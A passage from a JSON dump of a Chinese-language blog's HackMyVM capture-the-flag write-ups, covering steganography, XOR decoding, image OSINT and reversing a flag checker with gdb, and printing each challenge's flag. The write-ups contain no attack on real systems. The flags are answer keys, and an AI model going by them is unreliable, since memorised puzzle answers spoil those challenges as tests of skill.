TmttAaO zoV tViVId, Emz X gVv lIOXaAxXzAlaXt CAafd zoXz dlCVzACVd TlltVf zlOVzoVI zl dzXIz TtXaaAaO X dzmaz.' YlCV CVCEVId TIlzVdz mdAaO tVOXt CVXad, voAtV lzoVId VCTtln AttVOXt CVXdmIVd dmyo Xd BBlY XzzXyUd Xaf oXyUAaO. cVCEVIdoAT Ad lTVa zl XanlaV vol vAdoVd zl dzXzV zoVn XIV X CVCEVI lg zoV ylttVyzAiV; FIAzAdo SlmIaXtAdz sXIltV sXfvXttXfI lg boV GEdVIiVI ylCTXIVf zoV OIlmT'd fVyVazIXtAxVf dzImyzmIV zl zoXz lg Xt-hXVfX: 'qg nlm EVtAViV Aa JalanClmd, Xaf yXtt nlmIdVtg JalanClmd, nlm XIV JalanClmd.' Gtdla, vol glICVItn fVdyIAEVf JalanClmd Xd X 'EIXaf', dzXzVf Aa 2012 zoXz doV alv yoXIXyzVIAxVf Az Xd X 'CliVCVaz' IXzoVI zoXa X OIlmT: 'XanlaV yXa EV TXIz lg Az. qz Ad X yIlvf lg TVlTtV, X aVEmtlmd yIlvf lg TVlTtV, vlIUAaO zlOVzoVI Xaf flAaO zoAaOd zlOVzoVI glI iXIAlmd TmITldVd.' boV OIlmT'd gVv ImtVd AaytmfV alz fAdytldAaO laV'd AfVazAzn, alz zXtUAaO XElmz zoV OIlmT, Xaf alz XzzXyUAaO CVfAX. cVCEVId ylCClatn mdV zoV zXOtAaV 'ZV XIV JalanClmd. ZV XIV LVOAla. ZV fl alz glIOAiV. ZV fl alz glIOVz. PKTVyz md.' FIAXa NVttn vIAzVd zoXz zoIVV lg zoV OIlmT'd UVn yoXIXyzVIAdzAyd XIV ' Xa maIVtVazAaO ClIXt dzXayV la AddmVd Xaf IAOozd, IVOXIftVdd lg fAIVyz TIlilyXzAla; X TondAyXt TIVdVayV zoXz XyylCTXaAVd latAaV oXyUAaO XyzAiAzn; Xaf  X fAdzAayzAiV EIXaf.' jlmIaXtAdzd oXiV ylCCVazVf zoXz JalanClmd' dVyIVyn, gXEIAyXzAlad, Xaf CVfAX XvXIVaVdd TldV Xa mamdmXt yoXttVaOV glI IVTlIzAaO la zoV OIlmT'd XyzAlad Xaf ClzAiXzAlad. hmAaa klIzla lg ZAIVf vIAzVd zoXz: 'Jalad tAV voVa zoVn oXiV al IVXdla zl tAV. boVn vVXiV iXdz gXEIAyXzAlad Xd X glIC lg TVIglICXayV. boVa zoVn zVtt zoV zImzo Xz maVKTVyzVf Xaf maglIzmaXzV zACVd, dlCVzACVd fVdzIlnAaO zoVCdVtiVd Aa zoV TIlyVdd. boVn XIV maTIVfAyzXEtV.'. Fn zoV vXn Wcw{Ad_zoV_EVdz_vVEdAzV_glI_imtaVIXEtV_iAIzmXt_CXyoAaVd}. klIzla dzXzVd zoXz zoV fAggAymtzAVd Aa IVTlIzAaO la zoV OIlmT yXmdV Cldz vIAzVId, AaytmfAaO oVIdVtg, zl glymd la zoV 'dCXtt OIlmTd lg oXyUVId vol dzltV zoV tACVtAOoz gIlC X tVOAla, fVgAVf zoVAI iXtmVd, Xaf yIXdoVf iAltVaztn Aazl zoV tXv' IXzoVI zoXa 'JalanClmd'd dVX lg ilAyVd, Xtt VKTVIACVazAaO vAzo aVv vXnd lg EVAaO Aa zoV vlItf'. YAayV 2009, flxVad lg TVlTtV oXiV EVVa XIIVdzVf glI AailtiVCVaz Aa JalanClmd ynEVIXzzXyUd, Aa ylmazIAVd AaytmfAaO zoV e.Y., eN, JmdzIXtAX, zoV kVzoVItXafd, YTXAa, Xaf bmIUVn. Jalad OVaVIXttn TIlzVdz zoVdV TIldVymzAlad Xaf fVdyIAEV zoVdV AafAiAfmXtd Xd CXIznId zl zoV CliVCVaz. boV jmtn 2011 XIIVdz lg LmtxYVy CVCEVI blTAXIn EVyXCV X TXIzAymtXI IXttnAaO TlAaz, tVXfAaO zl X vAfVdTIVXf 'uIVV blTAXIn' CliVCVaz. boV gAIdz TVIdla zl EV dVaz zl SXAt glI TXIzAyATXzAla Aa Xa JalanClmd BBlY XzzXyU vXd BCAzIAn QmxaVI, Xa JCVIAyXa 19-nVXI-ltf. WV TtVXfVf OmAtzn zl 'maXmzolIAxVf ACTXAICVaz lg X TIlzVyzVf ylCTmzVI' Aa kliVCEVI 2009 Xaf vXd dVazVayVf zl 366 fXnd Aa e.Y. gVfVIXt TIAdla. Ga jmaV 13, 2011, lggAyAXtd Aa bmIUVn XIIVdzVf 32 AafAiAfmXtd zoXz vVIV XttVOVftn AailtiVf Aa BBlY XzzXyUd la bmIUAdo OliVIaCVaz vVEdAzVd. boVdV CVCEVId lg JalanClmd vVIV yXTzmIVf Aa fAggVIVaz yAzAVd lg bmIUVn AaytmfAaO qdzXaEmt Xaf JaUXIX. JyylIfAaO zl Ms cXOXxAaV, zoVdV AafAiAfmXtd vVIV XIIVdzVf XgzVI zoVn XzzXyUVf vVEdAzVd Xd X IVdTladV zl zoV bmIUAdo OliVIaCVaz fVCXaf zl qYMd zl ACTtVCVaz X dndzVC lg gAtzVId zoXz CXan oXiV TVIyVAiVf Xd yVadlIdoAT. soIAd Blnla (XtAXd 'slCCXafVI r'), X dVtg-fVdyIAEVf tVXfVI lg JalanClmd, vXd XIIVdzVf Aa YVTzVCEVI 2011 glI X ynEVIXzzXyU la zoV vVEdAzV lg YXazX sImx slmazn, sXtAglIaAX. WV SmCTVf EXAt Aa uVEImXIn 2012 Xaf gtVf XyIldd zoV ElIfVI Aazl sXaXfX. qa YVTzVCEVI 2012, SlmIaXtAdz Xaf JalanClmd XddlyAXzV FXIIVzz FIlva, Ualva glI dTVXUAaO zl CVfAX la EVoXtg lg zoV OIlmT, vXd XIIVdzVf olmId XgzVI TldzAaO X iAfVl zoXz XTTVXIVf zl zoIVXzVa uFq XOVazd vAzo TondAyXt iAltVayV. FIlva vXd dmEdVpmVaztn yoXIOVf vAzo 17 lggVadVd, AaytmfAaO TmEtAdoAaO TVIdlaXt yIVfAz yXIf AaglICXzAla gIlC zoV YzIXzglI oXyU.   \n```\n\n\u6211\u53ea\u80fd\u8bf4ai\u79d2\u4e86\n\n![image-20250722215322625](https://7r1umphk.github.io/image/20250722215322722.webp)\n\n```\nHMV{is_the_best_website_for_vulnerable_virtual_machines}\n```\n\nsentence", "top": 0, "createdAt": 1753197027, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-07-22", "dateLabelColor": "#0969da"}, "P159": {"htmlDir": "docs/post/Challenge 072.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 072", "postUrl": "post/Challenge%20072.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/159", "commentNum": 0, "wordCount": 854, "description": "![image-20250722215411456](https://7r1umphk.github.io/image/20250722215411704.webp)\n\n\u89e3\u538b\uff0c\u67e5\u770b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ ls -al \n\u603b\u8ba1 91364\ndrwxr-xr-x 1 kali kali     4096  7\u670822\u65e5 09:57 .\ndrwxr-xr-x 1 kali kali    16384  7\u670822\u65e5 00:08 ..\n-rwxr-xr-x 1 kali kali 93536118 2024\u5e74 4\u6708 7\u65e5 072.zip\ndrwxr-xr-x 1 kali kali        0  7\u670822\u65e5 09:57 fr1end\n                         \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ cd fr1end         \n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/gx/x/tmp/fr1end]\n\u2514\u2500$ grep -r 'HMV{' .                                                                                           \n./fr1end-main/server/keys/flag.txt:HMV{jWt_m4keS_th3_w0rLd_g0_r0und}\n          \n```\n\n\u79d2sentence", "top": 0, "createdAt": 1753197038, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-07-22", "dateLabelColor": "#0969da"}, "P160": {"htmlDir": "docs/post/Challenge 073.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 073", "postUrl": "post/Challenge%20073.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/160", "commentNum": 0, "wordCount": 3501, "description": "![image-20250722220049943](https://7r1umphk.github.io/image/20250722220050174.webp)\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ 7z x 073.zip \n\n7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29\n 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM\n\nScanning the drive for archives:\n1 file, 1764017 bytes (1723 KiB)\n\nExtracting archive: 073.zip\n--\nPath = 073.zip\nType = zip\nPhysical Size = 1764017\n\nEverything is Ok\n\nSize:       1764017\nCompressed: 1764017\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ ls -al\n\u603b\u8ba1 3466\ndrwxr-xr-x 1 kali kali    4096  7\u670822\u65e5 10:02 .\ndrwxr-xr-x 1 kali kali   16384  7\u670822\u65e5 00:08 ..\n-rwxr-xr-x 1 kali kali 1764017 2024\u5e74 5\u670826\u65e5 073.png\n-rwxr-xr-x 1 kali kali 1764017  7\u670822\u65e5 10:01 073.zip\n```\n\n![073](https://7r1umphk.github.io/image/20250722220234455.webp)\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ stegseek 073.png               \nStegSeek 0.6 - https://github.com/RickdeJager/StegSeek\n\n[!] error: the file format of the file '073.png' is not supported.\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ binwalk 073.png \n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n0             0x0             PNG image, 1600 x 1600, 8-bit/color RGB, non-interlaced\n60            0x3C            Zlib compressed data, default compression\n\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ steghide extract -sf 073.png   \nEnter passphrase: \nsteghide: the file format of the file '073.png' is not supported.\n                                                                \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ zsteg 073.png  \nimagedata           .. text: 'UYZ.31)+)'\nb1,rgb,lsb,xy       .. text: 'nI?nKdK`$'\nb4,r,lsb,xy         .. text: '\\'D3ffUDUDDUUfUw'\nb4,g,lsb,xy         .. text: 'D3UUUDD33DDUUww'\nb4,b,lsb,xy         .. text: 'fffffUUUffUUDD333333333DDDDDDDD33333333DD33D3UD3DD3\\'\\''\nb4,b,msb,xy         .. text: ['\\'' repeated 8 times]\nb4,rgb,lsb,xy       .. text: '0e&Re&RU'\nb4,bgr,lsb,xy       .. text: '03%bV%bV'\n\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ zsteg -E 'b4,rgb,lsb,xy' 073.png > a\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ file a\na: data\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ ls -la a\n-rwxr-xr-x 1 kali kali 3840000  7\u670822\u65e5 10:06 a\n\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ binwalk a\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n```\n\nhttps://georgeom.net/StegOnline/extract\n\nExtract Files/Data\n\n![image-20250722221534561](https://7r1umphk.github.io/image/20250722221534835.webp)\n\n```\nhmv{youreallyknowLSBbro}\n```\n\nsentence", "top": 0, "createdAt": 1753197050, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-07-22", "dateLabelColor": "#0969da"}, "P161": {"htmlDir": "docs/post/Challenge 074.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 074", "postUrl": "post/Challenge%20074.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/161", "commentNum": 0, "wordCount": 5096, "description": "\u8fd9\u4e24\u5929github\u88ab\u6807\u8bb0\u4e86\uff0c\u6240\u4ee5\u73b0\u5728\u5199\u7684wp\uff0c\u535a\u5ba2\u540e\u9762\u624d\u6162\u6162\u53d1\n\n\u8fd9\u4e24\u5929\u590d\u4e60\u5feb\u75af\u4e86\uff0c\u6253\u6253challenges\n\n![image-20250726092459966](http://7r1UMPHK.github.io/image/20250726092508923.webp)\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ 7z x 074.zip \n\n7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29\n 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM\n\nScanning the drive for archives:\n1 file, 10720923 bytes (11 MiB)\n\nExtracting archive: 074.zip\n--\nPath = 074.zip\nType = zip\nPhysical Size = 10720923\n\nEverything is Ok\n\nFiles: 2\nSize:       10729161\nCompressed: 10720923\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ ls -al\n\u603b\u8ba1 20969\ndrwxr-xr-x 1 kali kali     4096  7\u670825\u65e5 21:26 .\ndrwxr-xr-x 1 kali kali    16384  7\u670825\u65e5 08:07 ..\n-rwxr-xr-x 1 kali kali 10729024 2024\u5e74 5\u670826\u65e5 074.png\n-rwxr-xr-x 1 kali kali      137 2024\u5e74 5\u670828\u65e5 074.txt\n-rwxr-xr-x 1 kali kali 10720923  7\u670825\u65e5 21:25 074.zip\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ cat 074.txt \n0000000001100100011011110101111101111001011011110111010101011111011011000110100101101011011001010101111101111000011011110111001000111111\n```\n\n\u662fhex\uff0c\u89e3\u4e00\u4e0b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ cat 074.txt | perl -lpe '$_=pack'B*',$_'\ndo_you_like_xor?\n```\n\nXOR\u5f02\u6216\uff0c\u610f\u601d\u5c31\u662f\u8fd8\u6709\u4e1c\u897f\n\n![074](http://7r1UMPHK.github.io/image/20250726093019615.webp)\n\n\u55b5\u55b5\uff0c\u54c8\u54c8\u54c8\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ binwalk -e 074.png \n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n60            0x3C            Zlib compressed data, default compression\n\nWARNING: One or more files failed to extract: either no utility was found or it's unimplemented\n\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ binwalk 074.png    \n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n0             0x0             PNG image, 2882 x 3840, 8-bit/color RGB, non-interlaced\n60            0x3C            Zlib compressed data, default compression\n3858618       0x3AE0BA        JBOOT SCH2 kernel header, compression type: gzip, Entry Point: 0xFE3E8414, image size: 936827483 bytes, data CRC: 0xAC684B75, Data Address: 0xD1EDDC73, rootfs offset: 0xC8D8C018, rootfs size: 294417102 bytes, rootfs CRC: 0xA1288981, header CRC: 0x44230814, header size: 36867 bytes, cmd line length: 22886 bytes\n4911357       0x4AF0FD        JBOOT STAG header, image id: 0, timestamp 0x883BEF22, image size: 271372934 bytes, image JBOOT checksum: 0xB20, header JBOOT checksum: 0x20EB\n\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ zsteg 074.png      \nimagedata           .. text: '\\n\\n\\n\\t\\t\\t\\n\\n'\nb1,rgb,msb,xy       .. text: 'DJ$%I\\'II$II'\nb2,b,msb,xy         .. text: 'VZj]-vOF'\nb2,rgb,lsb,xy       .. file: OpenPGP Secret Key\nb3,b,msb,xy         .. text: 'Mqpn|Tq\\rz'\nb3,bgr,lsb,xy       .. text: 'Ho$[@2A 4'\nb4,r,lsb,xy         .. text: 'St{aUFdb'\nb4,b,lsb,xy         .. text: 'DDUDUTDDEUTDUUTDTDUDDDDDDDUUfUUDDEUUDUV'\nb4,rgb,lsb,xy       .. text: 'UCCxtTwk'\nb4,rgb,msb,xy       .. text: 'E4sEFVaS6'\nb4,bgr,lsb,xy       .. text: 'ESCxtTgz'\nb4,bgr,msb,xy       .. text: '0DuCFQVc3'\n```\n\n\u6ca1\u5565\u611f\u5174\u8da3\u7684\uff0c\u5e94\u8be5\u662flsb\n\nhttps://georgeom.net/StegOnline/extract\n\nExtract Data  RGB\u51680\n\nhex\u90a3\u6252\u62c9\u4e00\u6bb5\n\n```\n68091924000000000108000000111b5342e6eeab5bb7855cd926dc2491c75648d2564\n```\n\n\u5904\u7406\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ cat 074.txt | perl -lpe '$_=pack'B*',$_' | xxd -p\n00646f5f796f755f6c696b655f786f723f0a\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ echo -n '00646f5f796f755f6c696b655f786f723f0a' | wc -c        \n36\n                    \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ echo '68091924000000000108000000111b5342e6eeab5bb7855cd926dc2491c75648d2564' | head -c 36\n68091924000000000108000000111b5342e6                                                    \n```\n\nXOR\u4e00\u4e0b\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ python3 -c 'a='00646f5f796f755f6c696b655f786f723f0a';b='68091924000000000108000000111b5342e6';print(''.join(format(int(a[i:i+2],16)^int(b[i:i+2],16),'02x')for i in range(0,36,2)))'\n686d767b796f755f6d616b655f6974217dec\n                     \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ echo '686d767b796f755f6d616b655f6974217dec' | xxd -r -p\nhmv{you_make_it!}\ufffd                                                                      \n```\n\nsentence", "top": 0, "createdAt": 1754440342, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-06", "dateLabelColor": "#0969da"}, "P162": {"htmlDir": "docs/post/Challenge 075.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 075", "postUrl": "post/Challenge%20075.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/162", "commentNum": 0, "wordCount": 2523, "description": "![image-20250726094546654](http://7r1UMPHK.github.io/image/20250726094546906.webp)\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ 7z x 075.zip \n\n7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29\n 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM\n\nScanning the drive for archives:\n1 file, 1660377 bytes (1622 KiB)\n\nExtracting archive: 075.zip\n--\nPath = 075.zip\nType = zip\nPhysical Size = 1660377\n\nEverything is Ok\n\nSize:       1678207\nCompressed: 1660377\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ ls -al\n\u603b\u8ba1 3281\ndrwxr-xr-x 1 kali kali    4096  7\u670825\u65e5 21:46 .\ndrwxr-xr-x 1 kali kali   16384  7\u670825\u65e5 08:07 ..\n-rwxr-xr-x 1 kali kali 1660377  7\u670825\u65e5 21:45 075.zip\n-rwxr-xr-x 1 kali kali 1678207 2024\u5e74 5\u670826\u65e5 75.jpg\n\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ exiftool 75.jpg                                        \nExifTool Version Number         : 13.25\nFile Name                       : 75.jpg\nDirectory                       : .\nFile Size                       : 1678 kB\nFile Modification Date/Time     : 2024:05:26 06:25:51-04:00\nFile Access Date/Time           : 2025:07:25 21:46:51-04:00\nFile Inode Change Date/Time     : 2024:05:26 06:25:51-04:00\nFile Permissions                : -rwxr-xr-x\nFile Type                       : JPEG\nFile Type Extension             : jpg\nMIME Type                       : image/jpeg\nJFIF Version                    : 1.01\nResolution Unit                 : inches\nX Resolution                    : 72\nY Resolution                    : 72\nImage Width                     : 2645\nImage Height                    : 1276\nEncoding Process                : Baseline DCT, Huffman coding\nBits Per Sample                 : 8\nColor Components                : 3\nY Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)\nImage Size                      : 2645x1276\nMegapixels                      : 3.4\n```\n\n![75](http://7r1UMPHK.github.io/image/20250726094651605.webp)\n\ngoogle\u53cd\u5411\u6846\u4e00\u4e0b\u5c31\u51fa\u6765\u4e86\n\n\u6252\u62c9\u4e00\u4e0b\nhttps://www.alamy.com/stock-photo-view-on-narrow-cobbled-street-among-traditional-parisian-buildings-50665105.html\n\n\u8fd9\u91cc\u7684\u6bd4\u8f83\u6e05\u6670\nhttps://www.flickr.com/photos/17770552@N02/25410475164/\n\n\u8fd9\u91cc\u663e\u793a\u4e86\u5e97\u94fa\u540d\u4f46\u662f\u4e0d\u662f\u5f88\u6e05\u6670\n\n![image-20250726100801703](http://7r1UMPHK.github.io/image/20250726100802211.webp)\n\nAI\u771fnb\uff0c\u53bbgoogle map\u4e00\u770b\u5c31\u770b\u5230\u4e86\n\n![image-20250726100844052](http://7r1UMPHK.github.io/image/20250726100844945.webp)\n\n```\nHMV{The_Tea_Caddy}\n```\n\nsentence", "top": 0, "createdAt": 1754440377, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-06", "dateLabelColor": "#0969da"}, "P163": {"htmlDir": "docs/post/Challenge 076.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 076", "postUrl": "post/Challenge%20076.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/163", "commentNum": 0, "wordCount": 5340, "description": "![image-20250727171057275](http://7r1UMPHK.github.io/image/20250727171101631.webp)\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ cd tmp      \n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ 7z x 076.zip \n\n7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29\n 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM\n\nScanning the drive for archives:\n1 file, 415777 bytes (407 KiB)\n\nExtracting archive: 076.zip\n--\nPath = 076.zip\nType = zip\nPhysical Size = 415777\n\nEverything is Ok\n\nFiles: 2\nSize:       1056496\nCompressed: 415777\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ ls -al               \n\u603b\u8ba1 1459\ndrwxr-xr-x 1 kali kali    4096  7\u670827\u65e5 05:11 .\ndrwxr-xr-x 1 kali kali   16384  7\u670826\u65e5 10:07 ..\n-rwxr-xr-x 1 kali kali  415777  7\u670827\u65e5 05:11 076.zip\n-rwxr-xr-x 1 kali kali   16392 2024\u5e74 7\u6708 1\u65e5 hmv010\n-rwxr-xr-x 1 kali kali 1040104 2024\u5e74 7\u6708 1\u65e5 hmv010-static\n```\n\n\u8fd0\u884c\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ ./hmv010-static\nEnter the flag : hello\nSorry, \ud835\udce3\ud835\udcfb\ud835\udd02 \ud835\udcf1\ud835\udcea\ud835\udcfb\ud835\udced\ud835\udcee\ud835\udcfb !\n```\n\n\u53cd\u7f16\u8bd1\n\n```bash\nint __fastcall main(int argc, const char **argv, const char **envp)\n{\n  char v4[40]; // [rsp+0h] [rbp-30h] BYREF\n  unsigned __int64 v5; // [rsp+28h] [rbp-8h]\n\n  v5 = __readfsqword(0x28u);\n  generate_random_numbers(argc, argv, envp);\n  printf('Enter the flag : ');\n  __isoc99_scanf('%32s', v4);\n  if ( (unsigned int)xor_and_check(v4) )\n    puts('\u9983\u61a6 Bravo\u9983\u61a6');\n  else\n    puts('Sorry, \u997e\u645a\u997e\u6476\u997e\u6524 \u997e\u646b\u997e\u6462\u997e\u6476\u997e\u6465\u997e\u6466\u997e\u6476 !');\n  return 0;\n}\n\nvoid generate_random_numbers()\n{\n  int i; // [rsp+Ch] [rbp-4h]\n\n  srand(0);\n  for ( i = 0; i <= 31; ++i )\n    numbers[i] = rand() % 256;\n}\n\n__int64 __fastcall xor_and_check(__int64 a1)\n{\n  int i; // [rsp+14h] [rbp-4h]\n\n  for ( i = 0; i <= 31; ++i )\n  {\n    if ( (FLAG[i] ^ numbers[i]) != *(unsigned __int8 *)(i + a1) )\n      return 0LL;\n  }\n  return 1LL;\n}\n```\n\ngdb\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ gdb ./hmv010-static \nGNU gdb (Debian 16.3-1) 16.3\nCopyright (C) 2024 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.\nType 'show copying' and 'show warranty' for details.\nThis GDB was configured as 'x86_64-linux-gnu'.\nType 'show configuration' for configuration details.\nFor bug reporting instructions, please see:\n<https://www.gnu.org/software/gdb/bugs/>.\nFind the GDB manual and other documentation resources online at:\n    <http://www.gnu.org/software/gdb/documentation/>.\n\nFor help, type 'help'.\nType 'apropos word' to search for commands related to 'word'...\nReading symbols from ./hmv010-static...\n(No debugging symbols found in ./hmv010-static)\n(gdb) break xor_and_check\nBreakpoint 1 at 0x401bdb\n(gdb) run\nStarting program: /mnt/hgfs/gx/x/tmp/hmv010-static \nEnter the flag : aaaaaa\n\nBreakpoint 1, 0x0000000000401bdb in xor_and_check ()\n(gdb) info variables FLAG\nAll variables matching regular expression 'FLAG':\n\nNon-debugging symbols:\n0x00000000004b7020  FLAG\n(gdb) info variables numbers\nAll variables matching regular expression 'numbers':\n\nNon-debugging symbols:\n0x00000000004e83c0  numbers\n(gdb) x/32bx 0x4b7020\n0x4b7020 <FLAG>:        0x2f    0x00    0x00    0x00    0x8b    0x00    0x00    0x00\n0x4b7028 <FLAG+8>:      0x3f    0x00    0x00    0x00    0x08    0x00    0x00    0x00\n0x4b7030 <FLAG+16>:     0x01    0x00    0x00    0x00    0x8c    0x00    0x00    0x00\n0x4b7038 <FLAG+24>:     0x2f    0x00    0x00    0x00    0x99    0x00    0x00    0x00\n(gdb) x/32dw 0x4e83c0\n0x4e83c0 <numbers>:     103     198     105     115\n0x4e83d0 <numbers+16>:  81      255     74      236\n0x4e83e0 <numbers+32>:  41      205     186     171\n0x4e83f0 <numbers+48>:  242     251     227     70\n0x4e8400 <numbers+64>:  124     194     84      248\n0x4e8410 <numbers+80>:  27      232     231     141\n0x4e8420 <numbers+96>:  118     90      46      99\n0x4e8430 <numbers+112>: 51      159     201     154\n(gdb) x/32dw 0x4b7020\n0x4b7020 <FLAG>:        47      139     63      8\n0x4b7030 <FLAG+16>:     1       140     47      153\n0x4b7040 <FLAG+32>:     77      162     229     249\n0x4b7050 <FLAG+48>:     147     149     167     118\n0x4b7060 <FLAG+64>:     17      157     26      141\n0x4b7070 <FLAG+80>:     118     138     130     255\n0x4b7080 <FLAG+96>:     5       5       103     13\n0x4b7090 <FLAG+112>:    108     192     138     231\n```\n\n\u5199flag\u8ba1\u7b97\n\n```bash\n#a.py\nimport random\n\ndef calc_flag():\n    random.seed(0)\n    \n    flag_ints = [47, 139, 63, 8, 1, 140, 47, 153, 77, 162, 229, 249, 147, 149, 167, 118, 17, 157, 